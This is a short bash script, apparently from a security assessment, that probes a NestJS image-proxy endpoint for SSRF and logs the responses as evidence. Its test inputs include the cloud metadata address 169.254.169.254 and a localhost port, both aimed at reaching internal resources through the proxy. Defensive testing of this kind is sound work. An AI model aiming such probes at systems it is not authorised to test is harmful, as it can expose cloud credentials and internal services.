#!/usr/bin/env bash
# VULN-01: Test open image proxy / SSRF surface on NestJS
set -euo pipefail

OUT_DIR="$(cd "$(dirname "$0")/../evidence" && pwd)"
API_BASE="${NEST_API_URL:-http://localhost:5002}"
LOCAL_API="${NEST_LOCAL_URL:-http://localhost:3000}"
OUT_FILE="$OUT_DIR/VULN-01-open-proxy.txt"

mkdir -p "$OUT_DIR"

pick_api() {
  for base in "$API_BASE" "$LOCAL_API"; do
    if curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 "$base/" 2>/dev/null | grep -qE '^(200|404|401)'; then
      echo "$base"
      return 0
    fi
  done
  echo "$API_BASE"
}

BASE=$(pick_api)

{
  echo "=== VULN-01 Open Proxy / SSRF Tests ==="
  echo "API base: $BASE"
  echo "Timestamp: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
  echo ""

  test_url() {
    local label="$1"
    local target="$2"
    local encoded
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$target', safe=''))" 2>/dev/null || echo "$target")
    echo "--- $label ---"
    echo "Target URL: $target"
    echo "Request: GET $BASE/proxy/image?url=$encoded"
    curl -s -D - --connect-timeout 8 -o /dev/null \
      "$BASE/proxy/image?url=$encoded" 2>&1 | head -20
    echo ""
  }

  test_url "Public image (control)" "https://www.google.com/favicon.ico"
  test_url "Metadata SSRF probe" "http://169.254.169.254/latest/meta-data/"
  test_url "Localhost probe" "http://127.0.0.1:5007/"
  test_url "Non-image HTML" "https://example.com/"
} | tee "$OUT_FILE"

echo "Saved: $OUT_FILE"
